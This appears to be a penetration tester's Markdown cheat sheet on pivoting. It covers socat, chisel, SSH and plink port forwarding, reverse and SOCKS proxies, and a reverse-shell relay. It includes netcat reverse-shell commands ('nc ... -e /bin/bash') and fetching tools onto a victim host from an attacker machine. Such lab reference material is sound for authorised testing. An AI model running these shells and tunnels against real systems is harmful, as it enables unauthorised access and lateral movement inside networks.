---
title: Port Forwarding
desc:
tags: [Chisel, Forwarding, Network, Port, Proxy, Reverse, Socat, SSH]
alts: []
render_with_liquid: true
---

## Proxy Management

1. **Use FoxyProxy**

    **[FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/){:target="_blank"}{:rel="noopener"}** is a browser exntension that manages a proxy.

    Setup Proxy and activate.

    ```
    1. Click the fox icon on browser.
    2. Click "Options" on the popup.
    3. Click "Add".
    4. Fill in the forms.

    Examples
    Title: 1337 Proxy
    Proxy Type: SOCKS4
    Proxy IP address or DNS name: 127.0.0.1
    Port: 1337

    5. Click "Save".
    6. Click the fox icon on browser again.
    7. Click the target proxy to activate.
    ```

<br />

## Port Forwarding

1. **Use Socat**

    1. **Install Socat in Remote Machine**

        In your local machine, open web server

        ```sh
        cd /usr/bin/
        python3 -m http.server 8000
        ```

        In remote machine, download socat from your local machine.

        ```sh
        wget http://<your-local-ip>:8000/socat -O ./socat
        # or
        curl <your-local-ip>:8000/socat -o ./socat
        ```

    - **Simple Port Forwarding**

        1. **Open Listener in Your Local Machine**

            ```sh
            nc -lvnp <local-port>
            ```

        2. **Run Socat in Remote Machine**

            ```sh
            ./socat tcp-l:<target-port>,fork,reuseaddr tcp:<local-ip>:<local-port> &
            nc <local-ip> <local-port> -e /bin/bash
            ```

            Then you can successfuly port forwarding.

        3. **Confirm in Your Local Machine**

            ```sh
            whoami
            ```

        4. **Stop Port Forwarding**

            ```sh
             # Stop backgrounds
            jobs
            # kill %<NUMBER>
            kill %1
            ```

    - **Quiet Port Forwarding**

        1. **Open Up Two Ports in Your Local Machine**

            ```sh
            ./socat tcp-l:<local-port> tcp-l:<remote-port>,fork,reuseaddr &
            ```

        2. **Make a Connection between the Local Port and the Remote Port**

            In remote machine,

            ```sh
            ./socat tcp:<local-ip>:<local-port> tcp:<remote-ip>:<remote-port>,fork &
            ```

        3. **Confirmation in Your Local Machine**

            For example, if <remote-port> is 8000 (HTTP), you can access to localhost:<remote-port> because <remote-ip> binds localhost.

        4. **Stop Port Forwarding**

            In remote machine,

            ```sh
            # Stop backgrounds
            jobs
            # kill %<NUMBER>
            kill %1
            ```

2. **Use Chisel**

    **[Chisel](https://github.com/jpillora/chisel){:target="_blank"}{:rel="noopener"}** is A fast TCP/UDP tunnel over HTTP.

    1. **Remote**

        In your local machine,

        ```sh
        chisel server -p <listen-port> --reverse &
        ```

        In the target machine,

        ```sh
        chisel client <attack-ip>:<listen-port> R:<local-port>:<target-ip>:<target-port>
        ```

    2. **Local**

        In the target machine,

        ```sh
        chisel server -p <listen-port>
        ```

        In your local machine,

        ```sh
        chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
        ```

3. **Use SSH**

    If you have gained to connect the remote SSH server, you can run port forwarding.  
    In your local machine,

    ```sh
     -f: Background
    # -N: Do not execute remote commands
    ssh -L 8000:<victim-ip-for-webserver>:80 victim-user@<victim-ip-for-ssh> -fN
    ```

    Entering localhost:8000 in browser, you can access to "<victim-ip-for-webserver>:80" through <victim-ip-for-ssh>.
    
    ```sh
    # To stop connection
    ps aux | grep ssh
    kill <PID>
    ```

<br />

## Reverse Shell Relay

1. **Use Socat**

    1. **Open Listener in Your Local Machine**

        ```sh
        nc -lvnp <local-port>
        ```

    2. **Run Socat in Remote Machine**

        ```sh
        ./socat tcp-l:8000 tcp:<local-ip>:<local-port> &
        nc 127.0.0.1 8000 -e /bin/bash
        ```

    3. **Confirmation in Your Local Machine**

        You can connect the remote shell, confirm by some commands.

        ```sh
        whoami
        ```

    4. **Stop Reverse Shell Relay**

        In remote machine,

        ```sh
        # Stop backgrounds
        jobs
        # kill %<NUMBER>
        kill %1
        ```

<br />

## Reverse Connection

1. **Use Plink (Windows)**

    **Plink** is a Windows command line version of the PuTTY SSH client.

    1. **Open Lisnter in Your Local Machine**

        ```sh
        nc -lvnp 4444
        ```

    2. **Run Reverse Connection in Target Machine**

        First of all, generate SSH keys. Two keys (public and private) will be generated.

        ```sh
        ssh-keygen
        ```

        Convert the private key for Windows.

        ```sh
        puttygen private_key -o private_key.ppk
        ```

        Run reverse connection using plink.

        ```sh
        cmd.exe /c echo y | .\plink.exe -R <attack-port>:<victim-ip>:<victim-port> attacker@<attack-ip> -i private_key.ppk -N
        ```

2. **Use SSH**

    1. **Generate SSH Keys in Remote Machine**

        ```sh
        ssh-keygen
        ```

        Then save them (public key and private key) to arbitrary folder.

        ```sh
        mkdir /home/remote-user/reverse-keys
        mv id_rsa /home/remote-user/reverse-keys
        mv id_rsa.pub /home/remote-user/reverse-keys
        ```

        Copy the content of public key (id_rsa.pug).

    2. **Add Content of Public Key to authorized_key in Your Local Machine**

        ```sh
        echo 'content of publick key' >> ~/.ssh/authorized_key
        ```

        To clarify that the key only for reverse connection, add the following line to this content in authorized_key.

        ```sh
        # ~/.ssh/authorized_key
        command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty id-rsa
        AAAAAB3NzaC........
        ```

        Check if SSH server is running.  
        If the server is not running, start SSH server.

        ```sh
        sudo systemctl status ssh
        ```

    3. **Run Reverse Proxy in Remote Machine**

        Reverse port forwarding using the private key (id_rsa)

        ```sh
        ssh -R <local-port>:<remote-ip>:<remote-port> local-user@<local-ip> -i id_rsa -fN
        ```

    4. **Confirmation in Your Local Machine**

        You can access to **<remote-ip>:<remote-port>**

    5. **Close Connection in Remote Machine**

        After that, stop reverse connection.

        ```sh
        ps aux | grep ssh
        sudo kill <PID>
        ```

<br />

## Address Binding

1. **Use SSH**

    In remote machine,
    
    ```sh
    # -f: Background
    # -N: Do not execute remote commands
    ssh -D 1337 victim-user@<victim-machine-ip> -fN
    ```

<br />

## Forwarding SOCKS Proxy

In the target machine,

```sh
chisel server -p <listen-port> --sock5
```

In your local machine,

```sh
chisel client <target-ip>:<listen-port> <proxy-port>:socks
```

<br />

## Reverse SOCKS Proxy

In your local machine,

```sh
chisel server -p <listen-port> --reverse &
```

In the target machine,

```sh
chisel client <attack-ip>:<listen-port> R:socks &
```

To stop connections,

```sh
jobs
kill %<NUMBER>
```